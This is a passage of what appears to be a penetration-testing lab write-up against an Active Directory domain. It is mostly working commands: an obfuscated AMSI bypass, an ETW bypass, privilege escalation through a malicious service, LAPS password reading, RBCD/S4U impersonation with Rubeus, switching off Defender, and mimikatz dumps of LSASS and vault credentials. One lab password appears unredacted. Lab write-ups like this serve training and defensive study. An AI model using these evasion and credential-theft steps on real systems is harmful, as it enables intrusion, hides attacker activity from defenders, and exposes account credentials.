## ATTACK CHAIN

1. `ITEmployeesUsers (itemployee15)` → `WriteProperty` → `LocalAdmins` → LAPS read → `AppServers (IT-APPSRV01$)` → lateral movement → credential hunting → access to privileged accounts (e.g., `orgadmin`)
2. `ITEmployeesMachines (IT-EMPLOYEE15$)` → `GenericWrite` → `IT-TRACK01` → RBCD → impersonation via S4U → remote execution → expanded attack surface → credential hunting / privilege escalation

## LOCAL PRIVILEGE ESCALATION

#### 1. Defense Evasion

During host enumeration, several active defensive controls were identified: AMSI, PowerShell Logging (ScriptBlock / Transcription), and ETW. These can generate telemetry or allow inspection of PowerShell scripts at runtime. To reduce operational visibility and minimize detectable artifacts, evasion techniques are applied before proceeding to post-exploitation. Applied in the following order to progressively disable or degrade the PowerShell inspection environment:

```powershell
# 1. AMSI bypass — prevents AV from scanning the script
$w = 'System.Manag';$r = '65 6d 65 6e 74 2e 41 75 74 6f 6d 61 74 69 6f 6e 2e'.Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$s=$s+$_};$c = 'Amsi'+'Utils';$assembly = [Ref].Assembly.GetType(('{0}{1}{2}' -f $w,$s,$c));$n = $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('YQBtAA==')));$b = 'siIn';$k = (([regex]::Matches("deliaFti",'.','RightToLeft') | foreach {$_.value}) -join '');$field = $assembly.GetField(('{0}{1}{2}' -f $n,$b,$k),'NonPublic,Static');$field.SetValue($null,$true)

# 2. ETW bypass — reduces PowerShell telemetry
[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
```

#### 2. Local Privilege Escalation

At this stage, certain credential harvesting techniques — such as extracting secrets from LSASS or accessing the Windows Credential Vault — require administrative privileges to interact with sensitive OS components. A High Integrity token is required before running tools like mimikatz.

```powershell
# Import module
Import-Module .\PrivescCheck.ps1
# Force reload if the module was already loaded or conflicts arise
Remove-Module PrivescCheck -ErrorAction SilentlyContinue; Import-Module \\TSCLIENT\linux\eop\PrivescCheck.ps1 -Force

# Run extended audit and generate HTML report
Invoke-PrivescCheck -Report PrivescCheck_$($env:COMPUTERNAME) -Format html
Invoke-PrivescCheck -Extended -Report PrivescCheckAll_$($env:COMPUTERNAME) -Format html
```

> `PrivescCheck` performs broader system analysis than tools like `PowerUp`, identifying weak security policies, credentials stored in the registry, scheduled tasks with dangerous configurations, complex service permissions, and other Windows misconfigurations that could enable privilege escalation.

During enumeration, the current user was found to have `AllAccess` over the Service Control Manager (SCM). This level of access allows creating or modifying services — which run under `NT AUTHORITY\SYSTEM` — representing a direct local escalation vector.

![Evidencia del laboratorio: captura revisada](/images/labs/gcb-lab/scm-permissions.png)


> The AMSI/ETW bypass affects ScriptBlock Logging (4104), so script content is not recorded — but process events (4688) and Sysmon telemetry may still fire.

#### 3. SCM Abuse — Creating a Malicious Service

Abusing an existing service is generally more OPSEC-safe than creating a new one. If a writable service is found, it is sufficient to modify its `binPath`: `sc.exe config service_name binPath= "C:\Windows\System32\cmd.exe /c net localgroup Administrators user /add"`. However, no modifiable service was identified during enumeration, so creating a new service is the only viable option.

```powershell
# 1. Create a malicious service — adds the current user to the local Administrators group
sc.exe create ada binPath= "cmd /c net localgroup Administrators IT\itemployee15 /add" start= demand

# 2. Verify service configuration
sc.exe qc ada 

# 3. Start the service to execute the payload
sc.exe start ada

# 4. Alternative if the service cannot be started immediately
sc.exe create ada2 binPath= "cmd /c net localgroup Administrators IT\itemployee15 /add" start= auto

# 5. Reboot the host to trigger the auto-start service
shutdown /r /f /t 0
```

> In this case a reboot via the lab web interface was required.

#### 4. Cleanup

```powershell
# 1. Remove created services
sc.exe delete ada
sc.exe delete ada2

# 2. (Optional) Remove user from local Administrators group
net localgroup Administrators IT\itemployee15 /delete
```

> Reapply bypass techniques to disable PowerShell telemetry in the new elevated session. Use `RunWithPathAsAdmin.bat` for PowerShell logging bypass.

## EXPLOITATION

### ITEmployeesUsers → WriteProperty on LocalAdmins → LAPS → IT-APPSRV01

#### 1. WriteProperty Abuse

`ITEmployeesUsers` has `WriteProperty` on `LocalAdmins`. The compromised user is added to the group.

```powershell
# Add current user to LocalAdmins
Add-ADGroupMember -Identity "LocalAdmins" -Members "ITEmployee15"

# Confirm membership
Get-ADGroupMember -Identity "LocalAdmins" | select Name
# itemployee15
# paadmin
```

#### 2. LAPS Abuse

```powershell
import-module .\Get-LAPSPasswords.ps1
Get-LAPSPasswords
Get-LAPSPasswords -Computer it-appsrv01
# REDACTED_SECRET

# mDe9q%{ojSdo4C
```

#### 3. Confirm Membership

```powershell
whoami /groups
# IT\LocalAdmins
```

> If the new group membership is not reflected in the current token, a new authentication session is needed. This can be achieved via `runas /user:it\itemployee15 cmd` if cleartext credentials are available. Otherwise, rebooting the host forces a new logon session with an updated security token.

#### 4. Remote Access

With the recovered LAPS password, remote access to `IT-APPSRV01` is established.

```powershell
winrs.exe -r:10.200.9.121 -u:".\Administrator" -p:'REDACTED_SECRET' cmd
Enter-PSSession -ComputerName it-appsrv01 -Credential (Get-Credential)
```

### ITEmployeesMachines → GenericWrite on IT-TRACK01

The compromised host `IT-EMPLOYEE15$`, a member of `ITEmployeesMachines`, has `GenericWrite` over the computer object `IT-TRACK01`. This allows modifying sensitive AD object attributes, including `msDS-AllowedToActOnBehalfOfOtherIdentity`, used by Resource-Based Constrained Delegation (RBCD). Controlling this attribute enables authorizing an attacker-controlled identity to delegate authentication to the target host, allowing impersonation of privileged users (e.g., `Administrator`) against its services.

```
IT-EMPLOYEE15$
      │
      │ GenericWrite
      ▼
IT-TRACK01
      │
      │ allows delegation
      ▼
it-attack01$
      │
      │ S4U
      ▼
impersonates Administrator
      │
      ▼
access to IT-TRACK01
```

#### 1. Establish Kerberos Context

A valid Kerberos context is established for the compromised identity `IT-EMPLOYEE15$` to perform AD object modifications.

```powershell
.\Rubeus.exe asktgt /domain:it.gcb.example /user:IT-EMPLOYEE15$ /ntlm:REDACTED_SECRET /ptt
```

#### 2. Create a Controlled Machine Account

A new machine account is created to serve as the delegated identity in the attack.

```powershell
Import-Module .\Powermad.ps1
New-MachineAccount -Domain it.gcb.example -DomainController 10.200.9.2 -MachineAccount it-attack01 -Password (ConvertTo-SecureString 'REDACTED_SECRET' -AsPlainText -Force)

New-MachineAccount -Domain gcbhr.example -DomainController 10.200.11.1 -MachineAccount hr-attack01 -Password (ConvertTo-SecureString 'REDACTED_SECRET' -AsPlainText -Force)
$attack01 = Get-ADComputer -Identity 'hr-attack01'
Set-ADComputer -Identity 'hr-dc02' -PrincipalsAllowedToDelegateToAccount $attack01
```

This creates `it-attack01$`, whose password and NTLM hash are fully controlled by the attacker.

#### 3. Configure RBCD

Using `GenericWrite` over `IT-TRACK01`, the controlled account `it-attack01$` is authorized to delegate authentication to that host.

```powershell
$attack01 = Get-ADComputer -Identity 'it-attack01'
Set-ADComputer -Identity 'it-track01' -PrincipalsAllowedToDelegateToAccount $attack01

# Verify
Get-ADComputer -Identity it-track01 -Properties Name,PrincipalsAllowedToDelegateToAccount | select Name,PrincipalsAllowedToDelegateToAccount
# Name       PrincipalsAllowedToDelegateToAccount
# ----       ------------------------------------
# IT-TRACK01 {CN=it-attack01,CN=Computers,DC=it,DC=gcb,DC=local}
```

`IT-TRACK01` now has RBCD configured, allowing `IT-ATTACK01$` to request service tickets via the S4U2Self + S4U2Proxy flow on behalf of any user, including `Administrator`.

#### 4. Confirm SPNs

```powershell
Get-ADComputer -Identity IT-TRACK01 -Properties * | select -ExpandProperty servicePrincipalName
# HTTP/it-track01.it.gcb.example
# TERMSRV/IT-TRACK01
# TERMSRV/it-track01.it.gcb.example
# WSMAN/it-track01
# WSMAN/it-track01.it.gcb.example
# RestrictedKrbHost/IT-TRACK01
# HOST/IT-TRACK01
# RestrictedKrbHost/it-track01.it.gcb.example
# HOST/it-track01.it.gcb.example
```

#### 5. Obtain Hash of IT-ATTACK01$

```powershell
.\Rubeus.exe hash /password:REDACTED_SECRET
# rc4_hmac : REDACTED_HASH
```

#### 6. S4U Abuse — Request a TGS as Administrator

```powershell 
.\Rubeus.exe s4u /user:it-attack01$ /rc4:REDACTED_SECRET /msdsspn:HTTP/it-track01.it.gcb.example /impersonateuser:Administrator /ptt
```

#### 7. Remote Access

With the Kerberos ticket injected into the current session, remote execution on `IT-TRACK01` is achieved.

```powershell
winrs.exe -r:it-track01.it.gcb.example cmd
```

## POST-EXPLOITATION

Credential harvesting via LSASS memory extraction and local artifact review. No Credential Guard or LSA Protection was present on the host, allowing direct LSASS access.

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

```powershell
.\mimikatz.exe "privilege::debug" "sekurlsa:REDACTED_SECRET" "vault:REDACTED_SECRET" "vault::cred /patch" "exit"
# mimikatz(commandline) # sekurlsa:REDACTED_SECRET
# IT-EMPLOYEE15$
# REDACTED_HASH
# itemployee15
# REDACTED_HASH

#           0.    Internet Explorer
#                 Ressource       : [STRING] https://10.200.9.111/
#                 Identity        : [STRING] itemployees
#                 *Authenticator* : [STRING] REDACTED_SECRET
#           1.    Internet Explorer
#                 Ressource       : [STRING] https://10.200.9.111/
#                 Identity        : [STRING] root
#                 *Authenticator* : [STRING] REDACTED_SECRET
```

```powershell
Set-MpPreference -DisableRealtimeMonitoring $false
```

`sekurlsa:REDACTED_SECRET` recovered NTLM hashes from active sessions; `vault::cred /patch` extracted credentials stored in the Windows Credential Manager, including credentials for `https://10.200.9.111`. PowerShell history on the host also exposed reusable credentials:

```powershell
Get-Content C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
# powershell -ep bypass $passwd = ConvertTo-SecureString "REDACTED_SECRET" -AsPlainText -Force
# powershell -ep bypass $passwd = ConvertTo-SecureString "REDACTED_SECRET" -AsPlainText -Force
```
